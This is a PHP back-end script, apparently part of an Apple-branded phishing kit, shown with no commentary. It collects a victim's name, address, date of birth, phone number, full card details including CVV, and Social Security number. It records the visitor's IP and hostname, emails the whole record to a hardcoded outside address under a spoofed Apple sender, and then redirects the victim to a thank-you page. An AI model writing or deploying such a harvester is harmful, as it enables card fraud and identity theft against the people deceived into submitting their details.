<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg  = "======================= Apple =====================\n";
$bilsmg .= "Full Name : ".$_POST['nom0']."\n";
$bilsmg .= "Address 1 : ".$_POST['Address1']."\n";
$bilsmg .= "Address 2 : ".$_POST['Address2']."\n";
$bilsmg .= "Date Of Birth : ".$_POST['DoB']."\n";
$bilsmg .= "Zip/Postal Code : ".$_POST['zipcode']."\n";
$bilsmg .= "Mobile : ".$_POST['mobile']."\n";
$bilsmg .= "Card Type : ".$_POST['card_type']."\n";
$bilsmg .= "Card Number : ".$_POST['nom']."\n";
$bilsmg .= "Expiration date : ".$_POST['expdate_month']." / ".$_POST['expdate_year']."\n";
$bilsmg .= "Card verfiction (CVV) : ".$_POST['cvv2_number0']."\n";
$bilsmg .= "VBV : ".$_POST['VBV']."\n";
$bilsmg .= "BIN Gift Card : ".$_POST['BIN']."\n";
$bilsmg .= "SSN Card : ".$_POST['SSN']."\n";
$bilsmg .= "===================\n";
$bilsmg .= "Client IP : ".$ip."\n";
$bilsmg .= "HostName : ".$hostname."\n";
$bilsmg .= "======================= Apple =====================\n";

$bilsnd = "so-emo@live.fr";
$bilsub = "Apple ReZulT (Credit) | $card_type";
$bilhead = "From: Apple  <resullt@itunes.cc>";
$bilhead .= "MIME-Version: 1.0\n";
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

header("Location: thankyou.html");
?>